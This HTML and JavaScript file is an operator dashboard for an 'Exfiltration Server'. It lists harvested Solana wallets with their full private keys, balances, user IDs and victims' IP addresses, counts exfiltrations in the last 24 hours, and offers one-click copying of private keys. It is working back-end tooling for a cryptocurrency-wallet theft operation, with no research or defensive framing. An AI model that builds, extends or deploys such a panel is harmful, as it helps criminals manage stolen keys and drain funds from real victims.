<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exfiltration Admin Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        .header {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #00ff00;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #333;
        }
        .stat-value {
            font-size: 32px;
            font-weight: bold;
            color: #00ff00;
            margin-top: 10px;
        }
        .login-form {
            background: #1a1a1a;
            padding: 40px;
            border-radius: 10px;
            max-width: 400px;
            margin: 100px auto;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            background: #2a2a2a;
            border: 1px solid #444;
            color: #00ff00;
            font-family: monospace;
        }
        button {
            background: #00ff00;
            color: #0a0a0a;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
        }
        button:hover {
            background: #00cc00;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: #1a1a1a;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #333;
        }
        th {
            background: #2a2a2a;
            color: #00ff00;
        }
        .delete-btn {
            background: #ff0000;
            color: white;
            padding: 5px 10px;
            font-size: 12px;
            cursor: pointer;
        }
        .delete-btn:hover {
            background: #cc0000;
        }
        .copy-btn {
            background: #0066cc;
            color: white;
            padding: 3px 8px;
            font-size: 11px;
            margin-left: 5px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        .copy-btn:hover {
            background: #0052a3;
        }
        .copy-btn.copied {
            background: #00cc00;
            color: black;
        }
        .wallet-cell, .key-cell, .user-cell {
            display: flex;
            align-items: center;
            gap: 5px;
            flex-wrap: wrap;
        }
        .truncate-text {
            font-family: monospace;
            font-size: 11px;
            word-break: break-all;
            max-width: 200px;
        }
        .full-text {
            display: none;
        }
        .pagination {
            margin-top: 20px;
            text-align: center;
        }
        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #00ff00;
            color: #0a0a0a;
            padding: 10px 20px;
            border-radius: 5px;
            font-weight: bold;
            z-index: 1000;
            animation: slideIn 0.3s ease;
        }
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        .action-buttons {
            display: flex;
            gap: 5px;
            align-items: center;
        }
    </style>
</head>
<body>
    <div class="container" id="app">
        <div id="loginScreen">
            <div class="login-form">
                <h2>🔐 Admin Login</h2>
                <input type="text" id="username" placeholder="Username">
                <input type="password" id="password" placeholder="Password">
                <button onclick="login()">Login</button>
            </div>
        </div>
        <div id="dashboard" style="display:none">
            <div class="header">
                <h1>🚀 Exfiltration Server (PostgreSQL)</h1>
                <div>
                    <button onclick="logout()">Logout</button>
                    <button onclick="clearAllData()" style="background:#ff0000">Clear All Data</button>
                    <button onclick="refreshData()">Refresh</button>
                </div>
            </div>
            <div class="stats-grid" id="stats"></div>
            <div style="overflow-x: auto">
                <table>
                    <thead>
                        <tr>
                            <th>Time</th>
                            <th>Wallet Address</th>
                            <th>Private Key</th>
                            <th>Balance (SOL)</th>
                            <th>User ID</th>
                            <th>IP Address</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody id="walletsBody">
                        <tr><td colspan="7">Loading...</td></tr>
                    </tbody>
                </table>
            </div>
            <div class="pagination" id="pagination"></div>
        </div>
    </div>

    <script>
        let token = null;
        let currentPage = 1;

        // Show toast notification
        function showToast(message, isError = false) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.style.background = isError ? '#ff0000' : '#00ff00';
            toast.style.color = isError ? 'white' : 'black';
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 2000);
        }

        // Copy to clipboard function
        async function copyToClipboard(text, fieldName) {
            try {
                await navigator.clipboard.writeText(text);
                showToast(`✅ ${fieldName} copied to clipboard!`);
                
                // Visual feedback on button
                event.target.textContent = 'Copied!';
                event.target.classList.add('copied');
                setTimeout(() => {
                    event.target.textContent = 'Copy';
                    event.target.classList.remove('copied');
                }, 1500);
            } catch (err) {
                showToast(`❌ Failed to copy ${fieldName}`, true);
            }
        }

        async function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            token = btoa(username + ':' + password);
            
            try {
                const response = await fetch('/api/stats', {
                    headers: { 'Authorization': 'Basic ' + token }
                });
                
                if (response.ok) {
                    document.getElementById('loginScreen').style.display = 'none';
                    document.getElementById('dashboard').style.display = 'block';
                    refreshData();
                } else {
                    alert('Invalid credentials');
                    token = null;
                }
            } catch (error) {
                alert('Login failed: ' + error.message);
            }
        }

        function logout() {
            token = null;
            document.getElementById('loginScreen').style.display = 'block';
            document.getElementById('dashboard').style.display = 'none';
        }

        async function refreshData() {
            if (!token) return;
            await loadStats();
            await loadWallets();
        }

        async function loadStats() {
            try {
                const response = await fetch('/api/stats', {
                    headers: { 'Authorization': 'Basic ' + token }
                });
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('stats').innerHTML = `
                        <div class="stat-card">
                            <div>💰 Total Wallets</div>
                            <div class="stat-value">${data.stats.totalWallets}</div>
                        </div>
                        <div class="stat-card">
                            <div>👤 Unique Users</div>
                            <div class="stat-value">${data.stats.uniqueUsers}</div>
                        </div>
                        <div class="stat-card">
                            <div>💎 Total Balance</div>
                            <div class="stat-value">${parseFloat(data.stats.totalBalance).toFixed(4)} SOL</div>
                        </div>
                        <div class="stat-card">
                            <div>📊 Last 24h</div>
                            <div class="stat-value">${data.stats.last24hExfiltrations}</div>
                        </div>
                    `;
                }
            } catch (error) {
                console.error('Failed to load stats:', error);
            }
        }

        async function loadWallets() {
            try {
                const response = await fetch(`/api/wallets?page=${currentPage}&limit=50`, {
                    headers: { 'Authorization': 'Basic ' + token }
                });
                const data = await response.json();
                
                if (data.success && data.data.length > 0) {
                    document.getElementById('walletsBody').innerHTML = data.data.map(wallet => `
                        <tr>
                            <td style="white-space: nowrap;">${new Date(wallet.collected_at).toLocaleString()}</td>
                            <td>
                                <div class="wallet-cell">
                                    <span class="truncate-text" title="${wallet.wallet_address}">${wallet.wallet_address.substring(0, 25)}...</span>
                                    <button class="copy-btn" onclick="copyToClipboard('${wallet.wallet_address.replace(/'/g, "\\'")}', 'Wallet Address')">Copy</button>
                                </div>
                            </td>
                            <td>
                                <div class="key-cell">
                                    <span class="truncate-text" title="${wallet.private_key}">${wallet.private_key.substring(0, 30)}...</span>
                                    <button class="copy-btn" onclick="copyToClipboard('${wallet.private_key.replace(/'/g, "\\'")}', 'Private Key')">Copy</button>
                                </div>
                            </td>
                            <td>${parseFloat(wallet.balance).toFixed(4)} SOL</td>
                            <td>
                                <div class="user-cell">
                                    <span class="truncate-text" title="${wallet.user_id || 'N/A'}">${(wallet.user_id || 'N/A').substring(0, 20)}</span>
                                    ${wallet.user_id && wallet.user_id !== 'N/A' ? `<button class="copy-btn" onclick="copyToClipboard('${wallet.user_id.replace(/'/g, "\\'")}', 'User ID')">Copy</button>` : ''}
                                </div>
                            </td>
                            <td>${wallet.ip_address}</td>
                            <td>
                                <div class="action-buttons">
                                    <button class="delete-btn" onclick="deleteWallet(${wallet.id})">Delete</button>
                                </div>
                            </td>
                        </tr>
                    `).join('');
                    
                    const pagination = document.getElementById('pagination');
                    pagination.innerHTML = `
                        <button onclick="changePage(${currentPage - 1})" ${currentPage === 1 ? 'disabled' : ''}>Previous</button>
                        <span> Page ${currentPage} of ${data.pagination.pages} </span>
                        <button onclick="changePage(${currentPage + 1})" ${currentPage === data.pagination.pages ? 'disabled' : ''}>Next</button>
                    `;
                } else {
                    document.getElementById('walletsBody').innerHTML = '<tr><td colspan="7">No wallets found</td></tr>';
                }
            } catch (error) {
                console.error('Failed to load wallets:', error);
            }
        }

        function changePage(page) {
            currentPage = page;
            loadWallets();
        }

        async function deleteWallet(id) {
            if (confirm('Delete this wallet record?')) {
                await fetch(`/api/wallets/${id}`, {
                    method: 'DELETE',
                    headers: { 'Authorization': 'Basic ' + token }
                });
                refreshData();
            }
        }

        async function clearAllData() {
            if (confirm('⚠️ WARNING: This will delete ALL wallet data! Are you sure?')) {
                await fetch('/api/clear-all', {
                    method: 'DELETE',
                    headers: { 'Authorization': 'Basic ' + token }
                });
                refreshData();
            }
        }

        // Show login screen
        document.getElementById('loginScreen').style.display = 'block';
    </script>
</body>
</html>
